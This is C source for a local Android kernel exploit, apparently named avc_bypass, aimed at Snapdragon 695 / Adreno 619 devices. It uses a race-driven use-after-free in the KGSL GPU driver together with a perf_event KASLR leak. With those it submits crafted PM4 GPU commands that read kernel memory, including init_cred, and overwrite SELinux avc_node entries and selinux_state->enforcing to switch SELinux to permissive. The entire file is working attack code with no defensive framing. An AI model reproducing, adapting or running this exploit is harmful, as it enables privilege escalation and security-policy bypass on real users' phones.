#include "avc_bypass.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <time.h>
#include <signal.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>

static int kgsl_fd = -1;
static volatile int race_done = 0;
static uint64_t alloc_flags = 0;
static int uaf_id = -1;
static uint64_t g_kaslr = 0;

static void die(const char *msg) { perror(msg); exit(1); }

static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}
static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}
static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
}

static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}
static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}
static void *gpuobj_mmap(size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}
static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0 && gpuaddr) *gpuaddr = inf.gpuaddr;
    return ret;
}
static unsigned int create_context(void) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}
static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}
static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command gc = {0};
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
    gc.cmdsize = sizeof(cmd_obj);
    gc.numcmds = 1;
    gc.context_id = ctx_id;
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}
static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) return 0;

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_ip = 0;
    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            first_ip = *(uint64_t *)(hdr + 1);
            break;
        }
        tail += hdr->size;
    }
    munmap(buf, mmap_size);
    close(fd);

    if (first_ip == 0) return 0;
    return (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
}

static int gpu_read_indirect(uint64_t src_va, uint64_t *out,
                             uint64_t ib_ga, void *ib_m,
                             uint64_t dst_ga, void *dst_m,
                             unsigned int ctx_id, unsigned int ib_id) {
    uint32_t *cmd = (uint32_t *)ib_m;
    int dw = 0;

    memset(ib_m, 0, 0x10000);
    cmd[dw++] = cp_type7(CP_NOP, 0);
    {
        uint32_t lo, hi;
        split64(dst_ga, &lo, &hi);
        cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
        cmd[dw++] = lo; cmd[dw++] = hi;
        split64(src_va, &lo, &hi);
        cmd[dw++] = lo; cmd[dw++] = hi;
    }
    cmd[dw++] = cp_type7(CP_NOP, 0);
    __sync_synchronize();
    unsigned int ts;
    if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) return -1;
    if (wait_timestamp(ctx_id, ts) < 0) return -2;


    dw = 0;
    memset(ib_m, 0, 0x10000);
    cmd[dw++] = cp_type7(CP_NOP, 0);
    {
        uint32_t lo, hi;
        split64(dst_ga, &lo, &hi);
        cmd[dw++] = cp_type7(CP_MEM_TO_REG, 4);
        cmd[dw++] = 0x00000408;
        cmd[dw++] = lo; cmd[dw++] = hi;
    }
    cmd[dw++] = cp_type7(CP_NOP, 0);
    __sync_synchronize();
    if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) return -3;
    if (wait_timestamp(ctx_id, ts) < 0) return -4;

    dw = 0;
    memset(ib_m, 0, 0x10000);
    memset(dst_m, 0, 0x1000);
    cmd[dw++] = cp_type7(CP_NOP, 0);
    {
        uint32_t lo, hi;
        split64(dst_ga + 8, &lo, &hi);
        cmd[dw++] = cp_type7(CP_REG_TO_MEM, 4);
        cmd[dw++] = 0x0000040C;
        cmd[dw++] = lo; cmd[dw++] = hi;
    }
    cmd[dw++] = cp_type7(CP_NOP, 0);
    __sync_synchronize();
    if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) return -5;
    if (wait_timestamp(ctx_id, ts) < 0) return -6;

    __sync_synchronize();
    *out = *(uint64_t *)(dst_m + 8);
    return 0;
}

static int flip_avc_node(uint64_t node_va,
                          uint64_t ib_ga, void *ib_m,
                          uint64_t dst_ga, void *dst_m,
                          unsigned int ctx_id, unsigned int ib_id) {
    uint32_t *cmd = (uint32_t *)ib_m;
    int dw = 0;

    memset(ib_m, 0, 0x10000);
    cmd[dw++] = cp_type7(CP_NOP, 0);
    {
        uint32_t lo, hi;
        split64(node_va + 0xc, &lo, &hi);
        cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
        cmd[dw++] = lo; cmd[dw++] = hi;
        cmd[dw++] = 0xffffffff; cmd[dw++] = 0;
    }
    cmd[dw++] = cp_type7(CP_NOP, 0);
    __sync_synchronize();
    unsigned int ts;
    if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) return -1;
    if (wait_timestamp(ctx_id, ts) < 0) return -2;
    return 0;
}

/* ==================== レース (IMPORT を使わない版) ==================== */
static void *race_thread_allocfree(void *arg) {
    volatile int *done = (volatile int *)arg;
    while (!*done) {
        int id = gpuobj_alloc(0x1000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
        if (id >= 0) gpuobj_free(id);
        usleep(50);
    }
    return NULL;
}

static int phase2_race(void) {
    int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
    pthread_t thr;
    volatile int race_done_local = 0;
    if (pthread_create(&thr, NULL, race_thread_allocfree, (void*)&race_done_local) != 0) die("pthread");

    int hit = 0;
    for (int i = 0; i < 5000000; i++) {
        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
            kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
        if (e == ENODEV) { hit = 1; break; }
        if (i % 500000 == 0) printf("  race %d/5000000 errno=%d\n", i, e);
    }

    race_done_local = 1;
    pthread_join(thr, NULL);
    if (!hit) { printf("[-] Race failed\n"); return 0; }
    printf("[+] Race won!\n");
    return 1;
}

static void phase1_rbtree(void) {
    alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
    void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
    if (uaf_m == MAP_FAILED) die("mmap UAF");
    munmap(uaf_m, UAF_SIZE);

    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");

    int ph_id = gpuobj_alloc(PLACEHOLDER_SIZE, alloc_flags);
    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
    if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");
    printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
        (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
        (unsigned long)PLACEHOLDER_ADDR);
}

static void phase3_free_uaf(void) {
    gpuobj_free(uaf_id);
    printf("[+] UAF freed (dangling PTEs at 0x%lx+)\n", (unsigned long)(UAF_ADDR + 0x1000));
}

static int try_setenforce0(void) {
    int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
    if (fd < 0) return 0;
    ssize_t w = write(fd, "0", 1);
    close(fd);
    return (w == 1);
}

int main(int argc, char **argv) {
    setbuf(stdout, NULL);

    printf("[*] avc_bypass (Snapdragon 695 / Adreno 619)\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    g_kaslr = detect_kaslr();
    if (!g_kaslr) {
        printf("[-] Failed to detect KASLR\n");
        close(kgsl_fd);
        return 1;
    }
    printf("[+] KASLR = 0x%lx\n", (unsigned long)g_kaslr);

    uint64_t selinux_state_addr = g_kaslr + VMLINUX_SELINUX_STATE_OFFSET;
    printf("[*] selinux_state = 0x%lx\n", (unsigned long)selinux_state_addr);

    printf("[*] Phase 1: Setup UAF\n");
    phase1_rbtree();

    printf("[*] Phase 2: Race\n");
    if (!phase2_race()) { close(kgsl_fd); return 1; }

    printf("[*] Phase 3: Free UAF\n");
    phase3_free_uaf();

    unsigned int ctx_id = create_context();
    int ib_id = gpuobj_alloc(0x10000, alloc_flags);
    void *ib_m = gpuobj_mmap(0x10000, ib_id);
    uint64_t ib_ga = 0;
    gpuobj_info(ib_id, &ib_ga);
    int dst_id = gpuobj_alloc(0x4000, alloc_flags);
    void *dst_m = gpuobj_mmap(0x4000, dst_id);
    uint64_t dst_ga = 0;
    gpuobj_info(dst_id, &dst_ga);
    printf("[GPU] ctx=%u ib_ga=0x%lx dst_ga=0x%lx\n", ctx_id, (unsigned long)ib_ga, (unsigned long)dst_ga);

    uint64_t init_cred_addr = g_kaslr + VMLINUX_INIT_CRED_OFFSET;
    printf("[*] init_cred = 0x%lx\n", (unsigned long)init_cred_addr);

    uint64_t test_val = 0;
    if (gpu_read_indirect(init_cred_addr, &test_val, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id) == 0) {
        printf("[+] Indirect read of init_cred: 0x%016lx\n", (unsigned long)test_val);
    } else {
        printf("[-] Indirect read failed\n");
    }

    uint64_t avc_nodes[1024];
    int n_avc = 0;
    uint64_t scan_start = UAF_ADDR + 0x2000;
    uint64_t scan_end = UAF_ADDR + UAF_SIZE - 0x1000;
    printf("[*] Scanning UAF area for avc_node...\n");
    for (uint64_t va = scan_start; va < scan_end && n_avc < 1024; va += 0x1000) {
        uint64_t buf[8];
        if (gpu_read_indirect(va, buf, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id) == 0) {
            uint32_t *p = (uint32_t*)buf;
            if (p[0] >= 1 && p[0] <= 0x3fff && p[1] == 2 && p[2] == 1) {
                avc_nodes[n_avc++] = va;
                printf("[AVC] found at 0x%lx (sid=%u)\n", (unsigned long)va, p[0]);
            }
        }
    }
    printf("[*] Found %d avc_nodes\n", n_avc);

    int flipped = 0;
    for (int i = 0; i < n_avc; i++) {
        if (flip_avc_node(avc_nodes[i], ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id) == 0) {
            flipped++;
            if (try_setenforce0()) {
                printf("[+] setenforce 0 succeeded!\n");
                break;
            }
        }
    }
    printf("[*] Flipped %d nodes\n", flipped);

    if (!try_setenforce0()) {
        printf("[*] Fallback: writing selinux_state->enforcing = 0\n");
        uint32_t *cmd = (uint32_t *)ib_m;
        int dw = 0;
        memset(ib_m, 0, 0x10000);
        cmd[dw++] = cp_type7(CP_NOP, 0);
        {
            uint32_t lo, hi;
            split64(selinux_state_addr, &lo, &hi);
            cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
            cmd[dw++] = lo; cmd[dw++] = hi;
            cmd[dw++] = 0; cmd[dw++] = 0;  /* enforcing = false */
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        unsigned int ts;
        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) == 0) {
            wait_timestamp(ctx_id, ts);
            __sync_synchronize();
            if (try_setenforce0()) {
                printf("[+] Fallback succeeded: SELinux permissive\n");
            }
        }
    }

    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd >= 0) {
        char v[8];
        ssize_t n = read(fd, v, sizeof(v)-1);
        close(fd);
        if (n > 0) { v[n] = 0; printf("[*] getenforce: %s\n", v); }
    }

    close(kgsl_fd);
    return 0;
}
